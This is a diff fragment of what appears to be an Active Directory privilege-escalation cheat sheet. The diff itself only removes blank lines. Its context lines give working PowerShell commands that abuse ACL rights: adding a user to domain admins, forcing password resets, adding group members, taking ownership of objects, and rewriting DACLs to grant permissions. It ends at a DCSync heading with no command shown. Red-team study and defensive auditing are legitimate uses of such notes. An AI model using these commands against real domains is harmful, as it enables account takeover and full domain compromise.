@@ -79,26 +79,22 @@ net user <username> <password> /domain
 	```powershell
 	Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
 	```
-
 3. Self-Membership
 - Add to Group
 ```powershell
 Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
 ```
-
 4. ExtendedRight on
 - User-Force-Change-Password (Password Reset)
 ```powershell
 Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
 Set-DomainUserPassword -Identity delegate -Verbose
 ```
-
 5. WriteProperty
 - Add to Group
 ```powershell
 Add-ADGroupMember -Identity MachineAdmins -Members $otherDomainUser
 ```
-
 6. WriteOwner
 - Change the object’s owner
 ```powershell
@@ -108,7 +104,6 @@ Set-DomainObjectOwner -Identity testuser -Domain techcorp.local -OwnerIdentity "
 ```powershell
 Get-ADObject -Identity "CN=Users,DC=contoso,DC=com" -Properties Owner | Select-Object -ExpandProperty Owner
 ```
-
 7. WriteDACL
 - Grant Generic Permissions** (must be the owner)
 ```powershell
@@ -118,7 +113,6 @@ $ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityRe
 $ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
 $ADSI.psbase.commitchanges()
 ```
-
 8. DCSync Attack 
 - The user running the command must have Replicating Directory Changes permissions in Active Directory. This is typically assigned to domain admins or equivalent privileged accounts.
 ```powershell
